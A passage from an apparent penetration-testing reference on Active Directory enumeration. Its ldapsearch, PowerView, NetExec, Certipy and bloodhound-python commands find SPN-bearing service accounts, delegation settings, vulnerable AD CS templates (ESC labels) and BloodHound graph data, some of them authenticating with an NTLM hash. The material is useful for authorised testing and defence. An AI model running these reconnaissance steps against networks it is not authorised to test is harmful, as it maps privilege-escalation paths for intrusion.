+<div class="language-bash highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectClass=computer)(servicePrincipalName=*))&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span>
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="nb">Get-DomainComputer</span> <span class="n">-SPN</span>
+</span></code></pre></div>
+<p>Useful output:</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">samaccountname</span><span class="p">,</span><span class="n">serviceprincipalname</span><span class="p">,</span><span class="n">pwdlastset</span><span class="p">,</span><span class="n">lastlogontimestamp</span><span class="p">,</span><span class="n">memberof</span>
+</span></code></pre></div>
+<p><strong>AD module</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="nb">Get-ADUser</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(servicePrincipalName=*)&quot;</span> <span class="n">-Properties</span> <span class="n">servicePrincipalName</span><span class="p">,</span><span class="n">memberOf</span><span class="p">,</span><span class="n">pwdLastSet</span><span class="p">,</span><span class="n">lastLogonTimestamp</span>
+</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a><span class="nb">Get-ADComputer</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(servicePrincipalName=*)&quot;</span> <span class="n">-Properties</span> <span class="n">servicePrincipalName</span><span class="p">,</span><span class="n">dNSHostName</span><span class="p">,</span><span class="n">operatingSystem</span>
+</span></code></pre></div>
+<p><strong>Common SPNs</strong></p>
+<table>
+<thead>
+<tr>
+<th>SPN class</th>
+<th>Common meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>MSSQLSvc</code></td>
+<td>Microsoft SQL Server.</td>
+</tr>
+<tr>
+<td><code>HTTP</code></td>
+<td>Web service.</td>
+</tr>
+<tr>
+<td><code>CIFS</code></td>
+<td>SMB/file service.</td>
+</tr>
+<tr>
+<td><code>HOST</code></td>
+<td>Generic host services.</td>
+</tr>
+<tr>
+<td><code>LDAP</code></td>
+<td>LDAP service.</td>
+</tr>
+<tr>
+<td><code>TERMSRV</code></td>
+<td>RDP/terminal service.</td>
+</tr>
+<tr>
+<td><code>WSMAN</code></td>
+<td>WinRM.</td>
+</tr>
+<tr>
+<td><code>DNS</code></td>
+<td>DNS service.</td>
+</tr>
+<tr>
+<td><code>Exchange</code> / <code>exchangeMDB</code></td>
+<td>Exchange.</td>
+</tr>
+<tr>
+<td><code>FIMService</code></td>
+<td>Microsoft Identity Manager.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>SPN interpretation</strong></p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SPN on user account</td>
+<td>Likely service account.</td>
+</tr>
+<tr>
+<td>SPN on computer account</td>
+<td>Common for host services.</td>
+</tr>
+<tr>
+<td>MSSQL SPN</td>
+<td>SQL target.</td>
+</tr>
+<tr>
+<td>HTTP SPN</td>
+<td>Web app/service account target.</td>
+</tr>
+<tr>
+<td>Old password date</td>
+<td>May suggest weak password hygiene.</td>
+</tr>
+<tr>
+<td>Privileged group membership</td>
+<td>Higher-value service account.</td>
+</tr>
+<tr>
+<td>Many SPNs on one user</td>
+<td>Broad service usage.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="delegation">Delegation</h2>
+<p>Delegation enumeration identifies accounts and computers allowed to delegate Kerberos authentication.</p>
+<p>Delegation is important because misconfigured delegation can create privilege paths.</p>
+<p>This section only covers discovery and interpretation.</p>
+<p><strong>Delegation types</strong></p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unconstrained delegation</td>
+<td>Service can receive forwarded TGTs.</td>
+</tr>
+<tr>
+<td>Constrained delegation</td>
+<td>Service can delegate to specific services.</td>
+</tr>
+<tr>
+<td>Resource-Based Constrained Delegation</td>
+<td>Target resource defines who can act on its behalf.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>LDAP flags and attributes</strong></p>
+<table>
+<thead>
+<tr>
+<th>Attribute / flag</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>TRUSTED_FOR_DELEGATION</code></td>
+<td>Unconstrained delegation.</td>
+</tr>
+<tr>
+<td><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code></td>
+<td>Protocol transition / constrained delegation.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToDelegateTo</code></td>
+<td>Services allowed for constrained delegation.</td>
+</tr>
+<tr>
+<td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></td>
+<td>RBCD target-side attribute.</td>
+</tr>
+<tr>
+<td><code>AccountNotDelegated</code></td>
+<td>Account marked sensitive and not delegable.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NetExec</strong></p>
+<p>Unconstrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--trusted-for-delegation
+</span></code></pre></div>
+<p>Misconfigured delegation module:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--find-delegation
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>Unconstrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(userAccountControl:1.2.840.113556.1.4.803:=524288)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>servicePrincipalName<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>Constrained delegation:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToDelegateTo=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>msDS-AllowedToDelegateTo<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p>Protocol transition flag:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(userAccountControl:1.2.840.113556.1.4.803:=16777216)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>userAccountControl<span class="w"> </span>msDS-AllowedToDelegateTo
+</span></code></pre></div>
+<p>RBCD:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>sAMAccountName<span class="w"> </span>dNSHostName<span class="w"> </span>msDS-AllowedToActOnBehalfOfOtherIdentity
+</span></code></pre></div>
+<p>Sensitive and not delegated users:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>-b<span class="w"> </span><span class="s2">&quot;DC=corp,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;(userAccountControl:1.2.840.113556.1.4.803:=1048576)&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>sAMAccountName<span class="w"> </span>userAccountControl
+</span></code></pre></div>
+<p><strong>PowerView</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a><span class="nb">Get-DomainUser</span> <span class="n">-Unconstrained</span>
+</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-102-4"><a id="__codelineno-102-4" name="__codelineno-102-4" href="#__codelineno-102-4"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
+</span><span id="__span-102-5"><a id="__codelineno-102-5" name="__codelineno-102-5" href="#__codelineno-102-5"></a><span class="nb">Get-DomainObject</span> <span class="n">-LDAPFilter</span> <span class="s2">&quot;(msDS-AllowedToActOnBehalfOfOtherIdentity=*)&quot;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="adcs-enumeration">ADCS Enumeration</h2>
+<p>AD CS enumeration identifies certificate authorities, certificate templates, enrollment rights, and certificate-based authentication paths.</p>
+<p>AD CS is often high-value in AD environments because certificate templates and CA permissions can create authentication or privilege escalation paths.</p>
+<p>This section focuses on enumeration.</p>
+<p><strong>Certipy</strong></p>
+<p>Basic find:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Verbose output:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-v
+</span></code></pre></div>
+<p>Show vulnerable paths:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-vulnerable
+</span></code></pre></div>
+<p>Generate BloodHound output:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-bloodhound
+</span></code></pre></div>
+<p>Output files commonly include:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>*_Certipy.txt
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>*_Certipy.json
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>*_Certipy.zip
+</span></code></pre></div>
+<p>With hash:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-hashes<span class="w"> </span>:<span class="nv">$NTLM</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-vulnerable
+</span></code></pre></div>
+<p><strong>NetExec AD CS checks</strong></p>
+<p>ESC8-related check:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>adcs
+</span></code></pre></div>
+<p><strong>LDAP</strong></p>
+<p>Find Enterprise CAs:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-110-2"><a id="__codelineno-110-2" name="__codelineno-110-2" href="#__codelineno-110-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-110-3"><a id="__codelineno-110-3" name="__codelineno-110-3" href="#__codelineno-110-3"></a><span class="s2">&quot;(objectClass=pKIEnrollmentService)&quot;</span><span class="w"> </span>cn<span class="w"> </span>dNSHostName<span class="w"> </span>certificateTemplates
+</span></code></pre></div>
+<p>Find certificate templates:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$NETBIOS</span><span class="s2">\\</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a>-b<span class="w"> </span><span class="s2">&quot;CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a><span class="s2">&quot;(objectClass=pKICertificateTemplate)&quot;</span><span class="w"> </span>cn<span class="w"> </span>displayName<span class="w"> </span>pKIExtendedKeyUsage<span class="w"> </span>msPKI-Certificate-Name-Flag<span class="w"> </span>msPKI-Enrollment-Flag
+</span></code></pre></div>
+<p><strong>Windows</strong></p>
+<p>Certutil:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>certutil -config - -ping
+</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a>certutil -template
+</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a>certutil -catemplates
+</span></code></pre></div>
+<p>Certify:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>Certify.exe find
+</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>Certify.exe find /vulnerable
+</span></code></pre></div>
+<p><strong>Interesting AD CS fields</strong></p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CA name</td>
+<td>Certificate Authority name.</td>
+</tr>
+<tr>
+<td>CA hostname</td>
+<td>Server hosting the CA.</td>
+</tr>
+<tr>
+<td>Template name</td>
+<td>Certificate template.</td>
+</tr>
+<tr>
+<td>Enabled templates</td>
+<td>Templates issued by the CA.</td>
+</tr>
+<tr>
+<td>Enrollment rights</td>
+<td>Who can request certificates.</td>
+</tr>
+<tr>
+<td>EKU</td>
+<td>Certificate usage.</td>
+</tr>
+<tr>
+<td>Client Authentication EKU</td>
+<td>Can be useful for authentication.</td>
+</tr>
+<tr>
+<td>Enrollee supplies subject</td>
+<td>Subject/SAN control.</td>
+</tr>
+<tr>
+<td>Manager approval</td>
+<td>Whether approval is required.</td>
+</tr>
+<tr>
+<td>Authorized signatures</td>
+<td>Signature requirements.</td>
+</tr>
+<tr>
+<td>Template ACL</td>
+<td>Who can modify the template.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Common ESC labels to recognize</strong></p>
+<table>
+<thead>
+<tr>
+<th>Label</th>
+<th>General meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ESC1</td>
+<td>Misconfigured template allows requester-controlled subject with client auth.</td>
+</tr>
+<tr>
+<td>ESC2</td>
+<td>Any Purpose or broad EKU usage.</td>
+</tr>
+<tr>
+<td>ESC3</td>
+<td>Certificate Request Agent path.</td>
+</tr>
+<tr>
+<td>ESC4</td>
+<td>Template ACL abuse.</td>
+</tr>
+<tr>
+<td>ESC6</td>
+<td>CA-level subject alternative name behavior.</td>
+</tr>
+<tr>
+<td>ESC7</td>
+<td>CA permission abuse.</td>
+</tr>
+<tr>
+<td>ESC8</td>
+<td>NTLM relay to AD CS web enrollment.</td>
+</tr>
+<tr>
+<td>ESC9/ESC10</td>
+<td>Mapping / strong certificate binding related paths.</td>
+</tr>
+<tr>
+<td>ESC13</td>
+<td>Issuance policy group link path.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="bloodhound-collection">BloodHound Collection</h2>
+<p>BloodHound collection turns AD relationships into graph data.</p>
+<p>BloodHound is useful because AD privilege paths often depend on multiple relationships that are hard to see manually.</p>
+<p>This section focuses on collecting data from Linux or with built-in collectors.</p>
+<p><strong>NetExec BloodHound collector</strong></p>
+<p>Basic collection:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All
+</span></code></pre></div>
+<p>With DNS server:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All<span class="w"> </span>--dns-server<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>With Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-k<span class="w"> </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All<span class="w"> </span>--dns-server<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>Common output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>bloodhound_*.json
+</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a>*.zip
+</span></code></pre></div>
+<p><strong>bloodhound-python</strong></p>
+<p>Basic:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-ns<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-c<span class="w"> </span>All
+</span></code></pre></div>
+<p>Specify DC:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-dc<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-ns<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-c<span class="w"> </span>All
+</span></code></pre></div>
+<p>Kerberos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-k<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-dc<span class="w"> </span><span class="nv">$DC_HOST</span><span class="w"> </span>-ns<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-c<span class="w"> </span>All
+</span></code></pre></div>
+<p>Useful collection methods:</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Default</code></td>
+<td>Common default collection set.</td>
+</tr>
+<tr>
+<td><code>Group</code></td>
+<td>Group membership.</td>
+</tr>
+<tr>
